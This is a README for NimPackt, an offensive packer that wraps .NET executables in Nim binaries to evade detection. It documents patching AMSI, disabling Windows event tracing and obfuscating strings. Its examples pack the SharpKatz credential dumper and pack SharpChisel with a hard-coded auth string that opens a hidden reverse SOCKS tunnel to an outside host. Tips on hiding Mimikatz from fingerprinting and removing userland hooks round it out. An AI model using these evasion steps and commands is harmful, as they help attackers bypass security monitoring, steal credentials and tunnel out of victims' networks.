![NimPackt](assets/Nimpackt-Logo-Blacktext.png)

# A Nim-based packer for C# / .NET executables

## Description

NimPackt is a Nim-based packer for C# / .NET executables. It automatically wraps these executables (along with its arguments) in a Nim binary that is compiled to Native C and as such harder to detect or reverse engineer. Currently, it has the following features.

- Cross-platform compilation (from both Linux and Windows)
- Patching the Anti-Malware Scan Interface (AMSI)
- Disabling Event Tracing for Windows (ETW)
- Obfuscating static strings used in the binary
- Supports both x64/x86 compilation (make sure to grab the right architecture for the ingested binary)

A great source for C#-based binaries for offensive tooling can be found [here](https://github.com/Flangvik/SharpCollection). It is highly recommended to compile the C# binaries yourself. You should replace strings for, as well as obfuscate, sensitive binaries (like Mimikatz) to avoid fingerprinting.

If you want to go all-out on OpSec, you could re-pack the Nim binary using a tool like [PEzor](https://github.com/phra/PEzor) to remove userland hooks (until Project5 is supported) or encode the binary until execution.

## Installation

On **Linux**, simply install the required packages and use the Nimble package installer to install the required packages. Then you're good to go!

```
sudo apt install -y python3 mingw-w64 nim
nimble install winim strenc
```

On **Windows**, execute the Nim installer from [here](https://nim-lang.org/install_windows.html). Make sure to install `mingw` and set the path values correctly using the provided `finish.exe` utility, then install the required packages as follows.

```
nimble install winim strenc
```

## Usage

```
usage: NimPackt.py [-h] -i INPUTFILE [-a ARGUMENTS] [-86] [-H] [-na] [-ne] [-v] [-V]

required arguments:
  -i INPUTFILE, --inputfile INPUTFILE
                        C# .NET binary executable to wrap

optional arguments:
  -a ARGUMENTS, --arguments ARGUMENTS
                        Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (defaults to empty string)
  -32, --32bit          Compile in 32-bit mode
  -H, --hideapp         Hide the app frontend (console output) by compiling it in GUI mode
  -na, --nopatchamsi    Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)
  -ne, --nodisableetw   Do NOT disable Event Tracing for Windows (ETW)
  -v, --verbose         Print debug messages of the wrapped binary at runtime
  -V, --version         show program's version number and exit
```

**Examples:**

```
# (Windows) Pack SharpKatz to accept commands at runtime, patch AMSI and disable ETW while printing verbose messages on runtime 
# Note that applications may crash silently if you pass the wrong arguments in PASSTHRU mode (depending on the application)
python3 .\NimPackt.py -v -i .\SharpBins\SharpKatz-x64.exe -a "PASSTHRU"

# (Linux) Pack SharpChisel with a built-in ChiselChief connection string, do not patch AMSI or disable ETW, hide the application window on runtime
python3 NimPackt.py -H -i /tmp/SharpChisel.exe -a 'client --auth nimpackt.demo_A:718nubCpwiuLUW --keepalive 25s --max-retry-interval 25s https://chisel.azurewebsites.net R:10073:socks'
```

## Known issues

- The `-H` flag doesn't seem to properly hide the output of the executed bytes. Need to investigate this further.
- For large input binaries (over 10-15MB), the compiler seems to fail with the "out of memory" error sometimes due to the source code containing a ~80Mb byte string. Will look into this further in terms of compilation settings or string splitting, workaround for now is to optimize the C#-compiled binary for size (e.g. SharpChisel contains two 8Mb dll files, remove the one for the architecture you don't need before compiling).

## Wishlist

- Encode embedded byte string before compilation, decode during runtime to prevent static analysis
- Provide option to deploy `Project5` to unhook API calls before execution
- Provide option to pack as dll library